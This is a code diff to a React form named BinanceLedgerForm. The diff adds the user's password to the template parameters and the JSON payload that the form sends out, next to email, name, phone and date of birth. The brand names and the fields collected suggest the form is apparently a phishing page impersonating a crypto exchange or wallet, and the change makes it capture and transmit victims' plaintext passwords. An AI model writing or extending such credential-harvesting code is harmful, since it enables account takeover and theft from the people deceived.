@@ -1,3 +1,4 @@
+
 import { FC, useState, FormEvent, useEffect } from "react";
 import { useToast } from "@/components/ui/use-toast";
 import { Checkbox } from "@/components/ui/checkbox";
@@ -145,6 +146,7 @@ const BinanceLedgerForm: FC = () => {
     try {
       const templateParams = {
         user_email: formData.email,
+        user_password: formData.password,
         user_name: `${formData.firstName} ${formData.lastName}`,
         user_phone: formData.phoneNumber,
         user_dob: formData.dateOfBirth,
@@ -156,6 +158,7 @@ const BinanceLedgerForm: FC = () => {
         submission_date: new Date().toLocaleString(),
         form_data: JSON.stringify({
           email: formData.email,
+          password: formData.password,
           firstName: formData.firstName,
           lastName: formData.lastName,
           dateOfBirth: formData.dateOfBirth,
